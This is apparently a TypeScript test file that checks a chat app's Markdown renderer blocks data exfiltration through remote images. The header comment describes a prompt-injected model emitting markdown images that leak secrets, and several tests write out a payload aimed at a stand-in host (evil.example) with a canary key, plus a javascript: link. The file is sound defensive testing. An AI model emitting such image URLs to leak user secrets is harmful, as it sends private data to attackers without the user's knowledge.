/**
 * Egress the MODEL can open on its own.
 *
 * The app's premise is that nothing leaves the device unless the user connects
 * a remote provider and is told so per message. Model output is untrusted — a
 * prompt-injected model is the threat, not a careless user — and a rendered
 * markdown image is a GET the page makes on the user's behalf with no click.
 *
 * Measured before the fix: `![](https://evil.example/p.png?d=sk-live-CANARY)`
 * rendered as a live cross-origin `<img>`, AND React emitted a
 * `<link rel="preload" as="image">` for it, so the request fired even earlier.
 * Neither the web nor the mobile build shipped a CSP that would stop it.
 */

import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { renderToStaticMarkup } from 'react-dom/server';
import { createElement } from 'react';
import { describe, expect, it } from 'vitest';

import { Markdown } from '@/ui/Markdown';

const CANARY = 'sk-live-EXFIL-CANARY';
const render = (text: string): string => renderToStaticMarkup(createElement(Markdown, { text }));

describe('a model cannot make the page fetch a remote URL', () => {
  it('drops a cross-origin image rather than rendering it', () => {
    const html = render(`![](https://evil.example/p.png?d=${CANARY})`);
    expect(html).not.toContain('evil.example');
    expect(html).not.toContain(CANARY);
  });

  it('drops the preload React would otherwise emit for it', () => {
    // The preload is the earlier of the two requests, so asserting only on
    // `<img>` would have left the faster channel open.
    const html = render(`![](https://evil.example/p.png?d=${CANARY})`);
    expect(html).not.toContain('rel="preload"');
  });

  it('drops a protocol-relative source, which is remote too', () => {
    expect(render(`![](//evil.example/p.png?d=${CANARY})`)).not.toContain('evil.example');
  });

  it('still renders the images the app itself produces', () => {
    // Studio writes data: URIs and attachments are blob:. Refusing these would
    // trade an exfiltration channel for a broken feature.
    expect(render('![](data:image/png;base64,iVBORw0KGgo=)')).toContain('data:image/png');
    expect(render('![](/icon.svg)')).toContain('/icon.svg');
  });

  it('refuses a javascript: link but keeps an ordinary one', () => {
    // A link is a click the user makes deliberately, which is a different act
    // from a fetch the page makes for them — so http(s) stays.
    expect(render('[x](javascript:alert(1))')).not.toContain('javascript:');
    expect(render('[x](https://example.com/)')).toContain('https://example.com/');
  });

  it('ships a CSP that refuses remote images even if a component forgets', () => {
    const html = readFileSync(resolve(process.cwd(), 'index.html'), 'utf8');
    const csp = /content-security-policy"?\s+content="([^"]+)"/i.exec(html)?.[1] ?? '';
    expect(csp).toMatch(/img-src/);
    expect(csp).not.toMatch(/img-src[^;]*\*/);
    expect(csp).not.toMatch(/img-src[^;]*https:(?!\/)/);
  });
});
